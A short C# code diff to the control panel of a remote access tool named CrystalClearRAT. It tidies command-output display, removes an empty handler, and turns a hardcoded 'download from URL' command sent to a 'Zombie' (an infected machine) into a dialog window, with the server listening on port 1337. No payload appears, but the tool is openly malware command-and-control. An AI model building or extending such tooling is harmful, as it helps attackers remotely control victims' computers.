@@ -47,7 +47,7 @@ namespace CrystalClearRAT
 
         private void OnGenericCommandReceived(object sender, EventArgs e)
         {
-            Dispatcher.Invoke(() => { commandOutput.Text = (e as GenericCommandArgs).Command + commandOutput.Text; });
+            Dispatcher.Invoke(() => { commandOutput.Text = (e as GenericCommandArgs).Command + commandOutput.Text + Environment.NewLine; });
 
         }
 
@@ -55,15 +55,8 @@ namespace CrystalClearRAT
         {
             Server.Start(1337);
 
-
-            // Thread.Sleep(10);
-
         }
 
-        private void Button_Click(object sender, RoutedEventArgs e)
-        {
-
-        }
 
         private void OnMouseRightButtonDown(object sender, MouseButtonEventArgs e)
 
@@ -87,7 +80,7 @@ namespace CrystalClearRAT
 
         private void URLDownloadRequest_Click(object sender, RoutedEventArgs e)
         {
-            Server.Send(Download.Request(@"https://image.freepik.com/darmowe-wektory/kwiatowy-litera-l-alfabet-wektor_53876-87377.jpg", "saved.png"), GetZombieFromMenuItem(sender));
+            new URLDownloadRequestWindow(GetZombieFromMenuItem(sender)).Show();
         }
 
         private static Zombie GetZombieFromMenuItem(object menuItem)
